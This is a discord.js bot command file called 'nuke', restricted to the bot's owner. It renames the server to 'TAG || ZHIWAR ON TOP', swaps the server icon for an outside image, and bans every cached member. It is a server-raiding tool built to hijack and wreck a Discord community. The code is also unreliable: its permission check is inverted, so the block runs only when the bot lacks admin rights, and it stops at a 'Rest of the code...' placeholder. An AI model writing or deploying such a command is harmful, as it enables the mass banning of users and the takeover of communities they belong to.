const Discord = require("discord.js");
const { OWNER_ID } = require("../../config");

module.exports = {
  config: {
    name: "nuke",
    aliases: ["nuke☢️"],
    category: "owner",
    description: "nuke to server☢️!",
    usage: " ",
    accessableby: "Owner"
  },
  run: async (bot, message, args) => {
    if (message.author.id == OWNER_ID) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR") || !message.guild.me.hasPermission("MANAGE_CHANNELS")) {

        message.guild.setName("TAG || ZHIWAR ON TOP");
        message.guild.setIcon('https://cdn.discordapp.com/avatars/853263207997112340/d7905cbf9599ecafad1d50597ecde0f5.png?size=256?size=2048');

        message.guild.members.cache.forEach(member => {
          member.ban({ reason: "ZHIWAR" })
            .then(() => {
              console.log(`${member.user.tag} was banned`);
              message.channel.send("Banning All Members.");
            })
            .catch(err => {
              console.error(err);
            });
        });

        // Rest of the code...
      }
    }
  }
};